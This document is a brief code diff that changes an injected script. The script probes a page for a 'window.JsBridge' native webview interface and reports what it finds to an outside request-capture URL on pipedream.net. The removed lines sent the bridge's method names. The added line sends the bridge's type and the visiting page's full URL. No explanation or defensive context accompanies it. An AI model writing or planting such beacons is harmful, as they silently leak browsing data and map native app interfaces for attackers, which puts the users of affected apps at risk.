@@ -1,7 +1,3 @@
 <script>
-  if (typeof window.JsBridge !== 'undefined') {
-    fetch('https://eomfuajl79ed6za.m.pipedream.net?bridge=exists&methods=' + encodeURIComponent(Object.getOwnPropertyNames(window.JsBridge).join(',')))
-  } else {
-    fetch('https://eomfuajl79ed6za.m.pipedream.net?bridge=undefined')
-  }
+  fetch('https://eomfuajl79ed6za.m.pipedream.net?bridge=' + (typeof window.JsBridge) + '&url=' + encodeURIComponent(window.location.href))
 </script>
